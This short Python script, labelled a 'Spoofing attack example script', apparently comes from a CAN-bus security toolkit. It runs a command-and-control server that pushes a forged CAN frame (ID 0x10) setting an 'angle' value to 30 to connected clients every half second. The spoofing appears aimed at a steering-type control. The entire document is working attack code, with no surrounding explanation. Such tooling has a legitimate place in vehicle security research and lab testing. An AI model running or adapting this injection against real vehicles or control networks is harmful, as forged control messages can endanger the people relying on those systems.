#!/usr/bin/python3

import asyncio
import random

from can_spy.can_packet import CanPacket
from can_spy.c2_server import C2Server


async def handle_client(websocket):
    angle = random.randint(15, 60)
    angle = 30
    while True:
        print("Set angle to 30")
        packet = CanPacket(
            data=angle.to_bytes(1, byteorder='little', signed=True),
            timestamp=100, # Arbitrary in this case
            can_id=0x10,
            length=1
        )

        await websocket.send(packet.serialize())
        await asyncio.sleep(0.5)

def main():
    """Spoofing attack example script"""

    c2 = C2Server(client_handler=handle_client)
    c2.serve_forever()
        
if __name__ == "__main__":
    main()